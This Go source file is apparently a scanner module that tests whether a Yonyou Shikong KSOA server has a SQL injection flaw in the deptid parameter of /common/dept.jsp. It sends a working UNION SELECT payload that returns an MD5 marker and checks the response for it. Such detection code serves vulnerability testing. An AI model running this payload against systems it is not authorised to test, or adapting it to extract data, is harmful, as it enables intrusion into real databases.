package KSOA_sqljni_depti

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(10 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36"
)

func Run(url string) {
	// 构造带有 SQL 注入的 URL
	injectionURL := url + "/common/dept.jsp?deptid=1%27%20UNION%20ALL%20SELECT%2060%2Csys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27%2C%2712345%27))--"

	// 发送 GET 请求
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent": UA,
	}).Get(injectionURL)

	if err != nil {
		color.Red.Println("[-] 请求失败或用友时空 KSOA_sqljni_deptid SQL注入漏洞检测未能完成")
		return
	}

	// 检查响应状态码和响应体
	if resp.StatusCode == 200 && strings.Contains(resp.String(), "827ccb0eea8a706c4c34a16891f84e7") {
		color.Green.Println("[+] 用友时空 KSOA_sqljni_deptid SQL注入漏洞存在 -> " + url)
	} else {
		color.Red.Println("[-] 用友时空 KSOA_sqljni_deptid SQL注入漏洞不存在")
	}
}
